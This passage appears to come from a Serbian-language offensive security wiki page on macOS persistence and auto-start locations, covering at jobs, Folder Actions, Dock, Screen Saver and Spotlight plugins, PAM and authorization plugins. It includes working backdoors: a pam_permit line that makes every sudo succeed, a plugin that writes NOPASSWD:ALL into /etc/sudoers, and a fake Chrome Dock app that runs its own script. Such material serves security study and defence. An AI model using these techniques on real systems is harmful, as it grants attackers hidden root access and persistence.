`at` zadaci su namenjeni za **zakazivanje jednokratnih zadataka** koji će biti izvršeni u određeno vreme. Za razliku od cron poslova, `at` zadaci se automatski uklanjaju nakon izvršavanja. Važno je napomenuti da ovi zadaci opstaju nakon ponovnog pokretanja sistema, zbog čega u određenim uslovima mogu predstavljati bezbednosni rizik.<sup>[16]</sup>

Podrazumevano su **onemogućeni**, ali ih korisnik **root** može **omogućiti** pomoću:
```bash
sudo launchctl load -F /System/Library/LaunchDaemons/com.apple.atrun.plist
```
Ovo će kreirati datoteku za 1 sat:
```bash
echo "echo 11 > /tmp/at.txt" | at now+1
```
Proverite red poslova pomoću `atq:`
```shell-session
sh-3.2# atq
26	Tue Apr 27 00:46:00 2021
22	Wed Apr 28 00:29:00 2021
```
Iznad možemo videti dva zakazana posla. Detalje posla možemo prikazati pomoću `at -c JOBNUMBER`
```shell-session
sh-3.2# at -c 26
#!/bin/sh
# atrun uid=0 gid=0
# mail csaby 0
umask 22
SHELL=/bin/sh; export SHELL
TERM=xterm-256color; export TERM
USER=root; export USER
SUDO_USER=csaby; export SUDO_USER
SUDO_UID=501; export SUDO_UID
SSH_AUTH_SOCK=/private/tmp/com.apple.launchd.co51iLHIjf/Listeners; export SSH_AUTH_SOCK
__CF_USER_TEXT_ENCODING=0x0:0:0; export __CF_USER_TEXT_ENCODING
MAIL=/var/mail/root; export MAIL
PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin; export PATH
PWD=/Users/csaby; export PWD
SHLVL=1; export SHLVL
SUDO_COMMAND=/usr/bin/su; export SUDO_COMMAND
HOME=/var/root; export HOME
LOGNAME=root; export LOGNAME
LC_CTYPE=UTF-8; export LC_CTYPE
SUDO_GID=20; export SUDO_GID
_=/usr/bin/at; export _
cd /Users/csaby || {
echo 'Execution directory inaccessible' >&2
exit 1
}
unset OLDPWD
echo 11 > /tmp/at.txt
```
> [!WARNING]
> Ako AT tasks nisu omogućeni, kreirani tasks neće biti izvršeni.

**Fajlovi poslova** mogu se pronaći na `/private/var/at/jobs/`
```
sh-3.2# ls -l /private/var/at/jobs/
total 32
-rw-r--r--  1 root  wheel    6 Apr 27 00:46 .SEQ
-rw-------  1 root  wheel    0 Apr 26 23:17 .lockfile
-r--------  1 root  wheel  803 Apr 27 00:46 a00019019bdcd2
-rwx------  1 root  wheel  803 Apr 27 00:46 a0001a019bdcd2
```
Naziv fajla sadrži queue, broj job-a i vreme kada je zakazano njegovo pokretanje. Na primer, pogledajmo `a0001a019bdcd2`.

- `a` - ovo je queue
- `0001a` - broj job-a u hex formatu, `0x1a = 26`
- `019bdcd2` - vreme u hex formatu. Predstavlja broj minuta proteklih od epoch-a. `0x019bdcd2` je `26991826` u decimalnom formatu. Ako to pomnožimo sa 60, dobijamo `1619509560`, što je `GMT: 27. april 2021., utorak 7:46:00`.

Ako ispišemo job fajl, vidimo da sadrži iste informacije koje smo dobili korišćenjem `at -c`.

### Folder Actions

Writeup: [https://theevilbit.github.io/beyond/beyond_0024/](https://theevilbit.github.io/beyond/beyond_0024/)\
Writeup: [https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)

- Korisno za zaobilaženje sandbox-a: [✅](https://emojipedia.org/check-mark-button)
- Ali morate biti u mogućnosti da pozovete `osascript` sa argumentima kako biste kontaktirali **`System Events`** i mogli da konfigurišete Folder Actions
- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
- Ima neke osnovne TCC dozvole, kao što su Desktop, Documents i Downloads

#### Location

- **`/Library/Scripts/Folder Action Scripts`**
- Potreban je Root
- **Trigger**: Pristup navedenom folderu
- **`~/Library/Scripts/Folder Action Scripts`**
- **Trigger**: Pristup navedenom folderu

#### Description & Exploitation

Folder Actions su skripte koje se automatski pokreću pri promenama u folderu, kao što su dodavanje ili uklanjanje stavki, ili druge radnje poput otvaranja ili promene veličine prozora foldera. Ove akcije mogu da se koriste za različite zadatke i mogu se pokretati na različite načine, kao što su korišćenje Finder UI-ja ili terminalskih komandi.<sup>[17][18]</sup>

Za podešavanje Folder Actions imate opcije kao što su:

1. Kreiranje Folder Action workflow-a pomoću [Automator](https://support.apple.com/guide/automator/welcome/mac) i njegovo instaliranje kao service-a.
2. Ručno povezivanje skripte putem Folder Actions Setup-a u kontekstnom meniju foldera.
3. Korišćenje OSAScript-a za slanje Apple Event poruka aplikaciji `System Events.app`, radi programatskog podešavanja Folder Action-a.
- Ovaj metod je naročito koristan za ugrađivanje akcije u sistem, čime se obezbeđuje određeni nivo persistence-a.

Sledeća skripta je primer onoga što može da se izvrši pomoću Folder Action-a:
```applescript
// source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
Da bi gornja skripta mogla da se koristi sa Folder Actions, kompajlirajte je pomoću:
```bash
osacompile -l JavaScript -o folder.scpt source.js
```
Nakon kompajliranja skripte, podesite Folder Actions izvršavanjem skripte u nastavku. Ova skripta će globalno omogućiti Folder Actions i konkretno pridružiti prethodno kompajliranu skriptu fascikli Desktop.
```javascript
// Enabling and attaching Folder Action
var se = Application("System Events")
se.folderActionsEnabled = true
var myScript = se.Script({ name: "source.js", posixPath: "/tmp/source.js" })
var fa = se.FolderAction({ name: "Desktop", path: "/Users/username/Desktop" })
se.folderActions.push(fa)
fa.scripts.push(myScript)
```
Pokrenite setup script pomoću:
```bash
osascript -l JavaScript /Users/username/attach.scpt
```
- Ovo je način da implementirate ovu persistence funkcionalnost putem GUI-ja:

Ovo je skripta koja će biti izvršena:
```applescript:source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
Kompajlirajte ga pomoću: `osacompile -l JavaScript -o folder.scpt source.js`

Premestite ga u:
```bash
mkdir -p "$HOME/Library/Scripts/Folder Action Scripts"
mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
```
Zatim otvorite aplikaciju `Folder Actions Setup`, izaberite **folder koji želite da nadgledate** i u svom slučaju izaberite **`folder.scpt`** (u mom slučaju sam ga nazvao output2.scp):

<figure><img src="../images/image (39).png" alt="" width="297"><figcaption></figcaption></figure>

Sada, ako otvorite taj folder pomoću aplikacije **Finder**, vaša skripta će biti izvršena.

Ova konfiguracija je bila sačuvana u **plist** fajlu koji se nalazi na lokaciji **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`**, u base64 formatu.

Sada pokušajmo da pripremimo ovu persistence bez GUI pristupa:

1. **Kopirajte `~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** u `/tmp` kao rezervnu kopiju:
- `cp ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist /tmp`
2. **Uklonite** Folder Actions koje ste upravo podesili:

<figure><img src="../images/image (40).png" alt=""><figcaption></figcaption></figure>

Sada imamo prazno okruženje

3. Kopirajte rezervnu kopiju: `cp /tmp/com.apple.FolderActionsDispatcher.plist ~/Library/Preferences/`
4. Otvorite Folder Actions Setup.app da učitate ovu konfiguraciju: `open "/System/Library/CoreServices/Applications/Folder Actions Setup.app/"`

> [!CAUTION]
> Ovo meni nije funkcionisalo, ali ovo su instrukcije iz writeup-a:(

### Dock prečice

Writeup: [https://theevilbit.github.io/beyond/beyond_0027/](https://theevilbit.github.io/beyond/beyond_0027/)

- Korisno za zaobilaženje sandbox-a: [✅](https://emojipedia.org/check-mark-button)
- Ali morate imati instaliranu malicious aplikaciju unutar sistema
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Lokacija

- `~/Library/Preferences/com.apple.dock.plist`
- **Trigger**: Kada korisnik klikne na aplikaciju unutar Dock-a

#### Opis i Exploitation

Sve aplikacije koje se pojavljuju u Dock-u navedene su unutar plist-a: **`~/Library/Preferences/com.apple.dock.plist`**<sup>[19]</sup>

Moguće je **dodati aplikaciju** pomoću:
```bash
# Add /System/Applications/Books.app
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/System/Applications/Books.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'

# Restart Dock
killall Dock
```
Koristeći neki **social engineering**, mogli biste se **impersonate for example Google Chrome** unutar dock-a i zapravo izvršiti sopstveni script:
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
echo '#!/bin/sh
open /Applications/Google\ Chrome.app/ &
touch /tmp/ImGoogleChrome' > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
killall Dock
```
### Color Pickers

Writeup: [https://theevilbit.github.io/beyond/beyond_0017](https://theevilbit.github.io/beyond/beyond_0017/)

- Korisno za zaobilaženje sandbox-a: [🟠](https://emojipedia.org/large-orange-circle)
- Potrebno je da se dogodi veoma specifična radnja
- Završićete u drugom sandbox-u
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Lokacija

- `/Library/ColorPickers`
- Potreban je Root
- Trigger: Koristite color picker
- `~/Library/ColorPickers`
- Trigger: Koristite color picker

#### Opis i Exploit

**Compile-ujte color picker** bundle sa svojim kodom (možete koristiti [**ovaj, na primer**](https://github.com/viktorstrate/color-picker-plus)) i dodajte constructor (kao u odeljku [Screen Saver](macos-auto-start-locations.md#screen-saver)), a zatim kopirajte bundle u `~/Library/ColorPickers`.<sup>[20]</sup>

Zatim, kada se aktivira color picker, vaš kod bi takođe trebalo da se izvrši.

Imajte na umu da binary koji učitava vašu library ima **veoma restriktivan sandbox**: `/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`
```bash
[Key] com.apple.security.temporary-exception.sbpl
[Value]
[Array]
[String] (deny file-write* (home-subpath "/Library/Colors"))
[String] (allow file-read* process-exec file-map-executable (home-subpath "/Library/ColorPickers"))
[String] (allow file-read* (extension "com.apple.app-sandbox.read"))
```
### Finder Sync Plugins

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0026/](https://theevilbit.github.io/beyond/beyond_0026/)\
**Writeup**: [https://objective-see.org/blog/blog_0x11.html](https://objective-see.org/blog/blog_0x11.html)

- Korisno za zaobilaženje sandbox-a: **Ne, jer morate izvršiti sopstvenu aplikaciju**
- TCC bypass: ???

#### Lokacija

- Određena aplikacija

#### Opis i exploit

Primer aplikacije sa Finder Sync Extension [**možete pronaći ovde**](https://github.com/D00MFist/InSync).

Aplikacije mogu imati `Finder Sync Extensions`. Ova ekstenzija će se nalaziti unutar aplikacije koja će biti izvršena. Pored toga, da bi ekstenzija mogla da izvršava svoj kod, ona **mora biti potpisana** važećim Apple sertifikatom za developere, mora biti **sandboxed** (iako se mogu dodati opušteni izuzeci) i mora biti registrovana nečim poput:<sup>[21][22]</sup>
```bash
pluginkit -a /Applications/FindIt.app/Contents/PlugIns/FindItSync.appex
pluginkit -e use -i com.example.InSync.InSync
```
### Čuvar ekrana

Writeup: [https://theevilbit.github.io/beyond/beyond_0016/](https://theevilbit.github.io/beyond/beyond_0016/)\
Writeup: [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https://posts.specterops.io/saving-your-access-d562bf5bf90b)

- Korisno za zaobilaženje sandbox-a: [🟠](https://emojipedia.org/large-orange-circle)
- Ali ćete završiti u uobičajenom application sandbox-u
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Lokacija

- `/System/Library/Screen Savers`
- Potreban je root
- **Okidač**: Izaberite čuvar ekrana
- `/Library/Screen Savers`
- Potreban je root
- **Okidač**: Izaberite čuvar ekrana
- `~/Library/Screen Savers`
- **Okidač**: Izaberite čuvar ekrana

<figure><img src="../images/image (38).png" alt="" width="375"><figcaption></figcaption></figure>

#### Opis i exploit

Kreirajte novi projekat u Xcode-u i izaberite template za generisanje novog **Screen Saver**-a. Zatim mu dodajte svoj kod, na primer sledeći kod za generisanje logova.<sup>[23][24]</sup>

**Build**-ujte ga i kopirajte `.saver` bundle u **`~/Library/Screen Savers`**. Zatim otvorite Screen Saver GUI i samo kliknite na njega; trebalo bi da generiše veliki broj logova:
```bash
sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "hello_screensaver"'

Timestamp                       (process)[PID]
2023-09-27 22:55:39.622369+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver void custom(int, const char **)
2023-09-27 22:55:39.622623+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView initWithFrame:isPreview:]
2023-09-27 22:55:39.622704+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView hasConfigureSheet]
```
> [!CAUTION]
> Imajte na umu da ćete, pošto se u entitlements binarnog fajla koji učitava ovaj kod (`/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver`) možete pronaći **`com.apple.security.app-sandbox`**, biti **unutar uobičajenog application sandbox-a**.

Saver kod:
```objectivec
//
//  ScreenSaverExampleView.m
//  ScreenSaverExample
//
//  Created by Carlos Polop on 27/9/23.
//

#import "ScreenSaverExampleView.h"

@implementation ScreenSaverExampleView

- (instancetype)initWithFrame:(NSRect)frame isPreview:(BOOL)isPreview
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
self = [super initWithFrame:frame isPreview:isPreview];
if (self) {
[self setAnimationTimeInterval:1/30.0];
}
return self;
}

- (void)startAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super startAnimation];
}

- (void)stopAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super stopAnimation];
}

- (void)drawRect:(NSRect)rect
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super drawRect:rect];
}

- (void)animateOneFrame
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return;
}

- (BOOL)hasConfigureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return NO;
}

- (NSWindow*)configureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return nil;
}

__attribute__((constructor))
void custom(int argc, const char **argv) {
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
}

@end
```
### Spotlight Plugins

writeup: [https://theevilbit.github.io/beyond/beyond_0011/](https://theevilbit.github.io/beyond/beyond_0011/)

- Korisno za zaobilaženje sandbox-a: [🟠](https://emojipedia.org/large-orange-circle)
- Ali ćete završiti u application sandbox-u
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
- Sandbox izgleda veoma ograničeno

#### Lokacija

- `~/Library/Spotlight/`
- **Okidač**: Kreira se nova datoteka sa ekstenzijom kojom upravlja Spotlight plugin.
- `/Library/Spotlight/`
- **Okidač**: Kreira se nova datoteka sa ekstenzijom kojom upravlja Spotlight plugin.
- Potreban je root
- `/System/Library/Spotlight/`
- **Okidač**: Kreira se nova datoteka sa ekstenzijom kojom upravlja Spotlight plugin.
- Potreban je root
- `Some.app/Contents/Library/Spotlight/`
- **Okidač**: Kreira se nova datoteka sa ekstenzijom kojom upravlja Spotlight plugin.
- Potrebna je nova aplikacija

#### Opis i eksploatacija

Spotlight je macOS-ova ugrađena funkcija za pretragu, dizajnirana da korisnicima omogući **brz i sveobuhvatan pristup podacima na njihovim računarima**.\
Da bi omogućio ovu brzu mogućnost pretrage, Spotlight održava **vlasničku bazu podataka** i kreira indeks tako što **parsira većinu datoteka**, čime omogućava brze pretrage i naziva datoteka i njihovog sadržaja.<sup>[25]</sup>

Osnovni mehanizam Spotlight-a uključuje centralni proces pod nazivom „mds“, što je skraćenica za **„metadata server“**. Ovaj proces upravlja kompletnom Spotlight uslugom. Pored njega, postoji više „mdworker“ daemon-a koji izvršavaju različite zadatke održavanja, kao što je indeksiranje različitih tipova datoteka (`ps -ef | grep mdworker`). Ovi zadaci su mogući zahvaljujući Spotlight importer plugin-ovima, odnosno **„.mdimporter bundle-ovima“**, koji omogućavaju Spotlight-u da razume i indeksira sadržaj u velikom broju različitih formata datoteka.

Plugin-ovi ili **`.mdimporter`** bundle-ovi nalaze se na prethodno navedenim mestima, a ako se pojavi novi bundle, učitava se u roku od jednog minuta (nije potrebno ponovo pokretati nijednu uslugu). Ovi bundle-ovi moraju da navedu kojim **tipom datoteka i ekstenzijama mogu da upravljaju**, tako da će ih Spotlight koristiti kada se kreira nova datoteka sa navedenom ekstenzijom.

Moguće je **pronaći sve učitane `mdimporters`** pokretanjem:
```bash
mdimport -L
Paths: id(501) (
"/System/Library/Spotlight/iWork.mdimporter",
"/System/Library/Spotlight/iPhoto.mdimporter",
"/System/Library/Spotlight/PDF.mdimporter",
[...]
```
A na primer, **/Library/Spotlight/iBooksAuthor.mdimporter** se koristi za parsiranje ovih vrsta fajlova (između ostalih, ekstenzija `.iba` i `.book`):
```json
plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist

[...]
"CFBundleDocumentTypes" => [
0 => {
"CFBundleTypeName" => "iBooks Author Book"
"CFBundleTypeRole" => "MDImporter"
"LSItemContentTypes" => [
0 => "com.apple.ibooksauthor.book"
1 => "com.apple.ibooksauthor.pkgbook"
2 => "com.apple.ibooksauthor.template"
3 => "com.apple.ibooksauthor.pkgtemplate"
]
"LSTypeIsPackage" => 0
}
]
[...]
=> {
"UTTypeConformsTo" => [
0 => "public.data"
1 => "public.composite-content"
]
"UTTypeDescription" => "iBooks Author Book"
"UTTypeIdentifier" => "com.apple.ibooksauthor.book"
"UTTypeReferenceURL" => "http://www.apple.com/ibooksauthor"
"UTTypeTagSpecification" => {
"public.filename-extension" => [
0 => "iba"
1 => "book"
]
}
}
[...]
```
> [!CAUTION]
> Ako proverite Plist drugog `mdimporter` dodatka, možda nećete pronaći unos **`UTTypeConformsTo`**. To je zato što je to ugrađeni _Uniform Type Identifiers_ ([UTI](https://en.wikipedia.org/wiki/Uniform_Type_Identifier)) i nije potrebno da navodi ekstenzije.
>
> Štaviše, podrazumevani sistemski plugini uvek imaju prednost, tako da napadač može da pristupi samo datotekama koje Apple-ovi sopstveni `mdimporters` inače ne indeksiraju.

Da biste napravili sopstveni importer, možete početi sa ovim projektom: [https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer), a zatim promeniti naziv, **`CFBundleDocumentTypes`** i dodati **`UTImportedTypeDeclarations`** kako bi podržavao ekstenziju koju želite da podrži i navesti ih u **`schema.xml`**.\
Zatim **promenite** kod funkcije **`GetMetadataForFile`** tako da izvršava vaš payload kada se napravi datoteka sa obrađenom ekstenzijom.

Na kraju, **build-ujte i kopirajte novi `.mdimporter`** na jednu od prethodne tri lokacije i možete proveriti da li je učitan **praćenjem logova** ili proverom pomoću **`mdimport -L.`**

### ~~Preference Pane~~

> [!CAUTION]
> Izgleda da ovo više ne funkcioniše.

Writeup: [https://theevilbit.github.io/beyond/beyond_0009/](https://theevilbit.github.io/beyond/beyond_0009/)

- Korisno za sandbox bypass: [🟠](https://emojipedia.org/large-orange-circle)
- Zahteva konkretnu radnju korisnika
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Lokacija

- **`/System/Library/PreferencePanes`**
- **`/Library/PreferencePanes`**
- **`~/Library/PreferencePanes`**

#### Opis

Izgleda da ovo više ne funkcioniše.<sup>[26]</sup>

## Root Sandbox Bypass

> [!TIP]
> Ovde možete pronaći start locations korisne za **sandbox bypass**, koje vam omogućavaju da jednostavno izvršite nešto tako što ćete to **upisati u datoteku** kao **root** i/ili uz zahtev za drugim **neobičnim uslovima.**

### Periodic

Writeup: [https://theevilbit.github.io/beyond/beyond_0019/](https://theevilbit.github.io/beyond/beyond_0019/)

- Korisno za sandbox bypass: [🟠](https://emojipedia.org/large-orange-circle)
- Međutim, morate biti root
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Lokacija

- `/etc/periodic/daily`, `/etc/periodic/weekly`, `/etc/periodic/monthly`, `/usr/local/etc/periodic`
- Potreban je root
- **Trigger**: Kada dođe vreme
- `/etc/daily.local`, `/etc/weekly.local` ili `/etc/monthly.local`
- Potreban je root
- **Trigger**: Kada dođe vreme

#### Opis i eksploatacija

Periodic skripte (**`/etc/periodic`**) se izvršavaju zbog **launch daemons** konfigurisanih u `/System/Library/LaunchDaemons/com.apple.periodic*`. Imajte na umu da se skripte sačuvane u `/etc/periodic/` **izvršavaju** kao **vlasnik datoteke,** tako da ovo neće funkcionisati za potencijalnu eskalaciju privilegija.<sup>[27]</sup>
```bash
# Launch daemons that will execute the periodic scripts
ls -l /System/Library/LaunchDaemons/com.apple.periodic*
-rw-r--r--  1 root  wheel  887 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-daily.plist
-rw-r--r--  1 root  wheel  895 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-monthly.plist
-rw-r--r--  1 root  wheel  891 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-weekly.plist

# The scripts located in their locations
ls -lR /etc/periodic
total 0
drwxr-xr-x  11 root  wheel  352 May 13 00:29 daily
drwxr-xr-x   5 root  wheel  160 May 13 00:29 monthly
drwxr-xr-x   3 root  wheel   96 May 13 00:29 weekly

/etc/periodic/daily:
total 72
-rwxr-xr-x  1 root  wheel  1642 May 13 00:29 110.clean-tmps
-rwxr-xr-x  1 root  wheel   695 May 13 00:29 130.clean-msgs
[...]

/etc/periodic/monthly:
total 24
-rwxr-xr-x  1 root  wheel   888 May 13 00:29 199.rotate-fax
-rwxr-xr-x  1 root  wheel  1010 May 13 00:29 200.accounting
-rwxr-xr-x  1 root  wheel   606 May 13 00:29 999.local

/etc/periodic/weekly:
total 8
-rwxr-xr-x  1 root  wheel  620 May 13 00:29 999.local
```
Postoje i druge periodične skripte koje će biti izvršene, navedene u **`/etc/defaults/periodic.conf`**:
```bash
grep "Local scripts" /etc/defaults/periodic.conf
daily_local="/etc/daily.local"				# Local scripts
weekly_local="/etc/weekly.local"			# Local scripts
monthly_local="/etc/monthly.local"			# Local scripts
```
Ako uspete da upišete bilo koji od fajlova `/etc/daily.local`, `/etc/weekly.local` ili `/etc/monthly.local`, on će biti **izvršen pre ili kasnije**.

> [!WARNING]
> Imajte na umu da će periodic script biti **izvršen kao vlasnik script-a**. Dakle, ako je script u vlasništvu običnog korisnika, biće izvršen kao taj korisnik (ovo može sprečiti napade za eskalaciju privilegija).

### PAM

Writeup: [Linux Hacktricks PAM](../linux-hardening/software-information/pam-pluggable-authentication-modules.md)\
Writeup: [https://theevilbit.github.io/beyond/beyond_0005/](https://theevilbit.github.io/beyond/beyond_0005/)

- Korisno za zaobilaženje sandbox-a: [🟠](https://emojipedia.org/large-orange-circle)
- Ali morate biti root
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Lokacija

- Root je uvek neophodan

#### Opis i Exploitation

Pošto je PAM više usmeren na **persistence** i malware nego na jednostavno izvršavanje unutar macOS-a, ovaj blog neće pružiti detaljno objašnjenje, **pročitajte writeup-e da biste bolje razumeli ovu tehniku**.<sup>[28]</sup>

Proverite PAM module pomoću:
```bash
ls -l /etc/pam.d
```
Tehnika persistence/privilege escalation koja zloupotrebljava PAM jednostavna je koliko i izmena modula /etc/pam.d/sudo dodavanjem sledeće linije na početak:
```bash
auth       sufficient     pam_permit.so
```
Dakle, to će **izgledati** otprilike ovako:
```bash
# sudo: auth account password session
auth       sufficient     pam_permit.so
auth       include        sudo_local
auth       sufficient     pam_smartcard.so
auth       required       pam_opendirectory.so
account    required       pam_permit.so
password   required       pam_deny.so
session    required       pam_permit.so
```
I stoga će svaki pokušaj korišćenja **`sudo` uspeti**.

> [!CAUTION]
> Imajte na umu da je ovaj direktorijum zaštićen pomoću TCC-a, tako da je veoma verovatno da će korisnik dobiti upit za odobrenje pristupa.

Još jedan dobar primer je su, gde možete videti da je takođe moguće proslediti parametre PAM modulima (a ovaj fajl možete i backdoor-ovati):
```bash
cat /etc/pam.d/su
# su: auth account session
auth       sufficient     pam_rootok.so
auth       required       pam_opendirectory.so
account    required       pam_group.so no_warn group=admin,wheel ruser root_only fail_safe
account    required       pam_opendirectory.so no_check_shell
password   required       pam_opendirectory.so
session    required       pam_launchd.so
```
### Authorization Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0028/](https://theevilbit.github.io/beyond/beyond_0028/)\
Writeup: [https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)

- Korisno za zaobilaženje sandbox-a: [🟠](https://emojipedia.org/large-orange-circle)
- Ali morate biti root i napraviti dodatne konfiguracije
- TCC bypass: ???

#### Lokacija

- `/Library/Security/SecurityAgentPlugins/`
- Potreban je root
- Takođe je potrebno konfigurisati authorization bazu podataka da koristi plugin

#### Opis i eksploatacija

Možete kreirati authorization plugin koji će se izvršavati kada se korisnik prijavi, kako bi se održala persistence. Za više informacija o kreiranju jednog od ovih plugin-a pogledajte prethodne writeup-e (i budite oprezni, loše napisan plugin može da vam onemogući pristup sistemu, pa ćete morati da očistite Mac iz recovery mode-a).<sup>[29][30]</sup>
```objectivec
// Compile the code and create a real bundle
// gcc -bundle -framework Foundation main.m -o CustomAuth
// mkdir -p CustomAuth.bundle/Contents/MacOS
// mv CustomAuth CustomAuth.bundle/Contents/MacOS/

#import <Foundation/Foundation.h>

__attribute__((constructor)) static void run()
{
NSLog(@"%@", @"[+] Custom Authorization Plugin was loaded");
system("echo \"%staff ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers");
}
```
**Premestite** bundle na lokaciju sa koje će biti učitan:
```bash
cp -r CustomAuth.bundle /Library/Security/SecurityAgentPlugins/
```
Na kraju dodajte **rule** za učitavanje ovog Plugin-a:
```bash
cat > /tmp/rule.plist <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>class</key>
<string>evaluate-mechanisms</string>
<key>mechanisms</key>
<array>
<string>CustomAuth:login,privileged</string>
</array>
</dict>
</plist>
EOF

security authorizationdb write com.asdf.asdf < /tmp/rule.plist
```
**`evaluate-mechanisms`** će autorizacionom frameworku saopštiti da će morati da **pozove eksterni mehanizam za autorizaciju**. Pored toga, **`privileged`** će omogućiti da se izvršava kao root.

Pokrenite ga pomoću:
```bash
security authorize com.asdf.asdf
```
A zatim bi **staff grupa trebalo da ima sudo** pristup (pročitajte `/etc/sudoers` da biste to potvrdili).

### Man.conf

Writeup: [https://theevilbit.github.io/beyond/beyond_0030/](https://theevilbit.github.io/beyond/beyond_0030/)

- Korisno za zaobilaženje sandboxa: [🟠](https://emojipedia.org/large-orange-circle)
- Ali morate biti root, a user mora koristiti man
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- **`/private/etc/man.conf`**
- Potreban je root
- **`/private/etc/man.conf`**: Kad god se koristi man

#### Description & Exploit

Konfiguracioni fajl **`/private/etc/man.conf`** navodi binary/script koji se koristi pri otvaranju man dokumentacionih fajlova. Zato se putanja do executable-a može izmeniti tako da se svaki put kada user koristi man za čitanje dokumentacije izvrši backdoor.<sup>[31]</sup>

Na primer, postavite u **`/private/etc/man.conf`**:
```
MANPAGER /tmp/view
```
Zatim kreirajte `/tmp/view` kao:
```bash
#!/bin/zsh

touch /tmp/manconf

/usr/bin/less -s
```
### Apache2

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0025/](https://theevilbit.github.io/beyond/beyond_0025/)

- Korisno za zaobilaženje sandbox-a: [🟠](https://emojipedia.org/large-orange-circle)
- Ali morate biti root i apache mora biti pokrenut
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
- Httpd nema entitlements

#### Lokacija

- **`/etc/apache2/httpd.conf`**
- Potreban je root
- Okidač: Kada se Apache2 pokrene

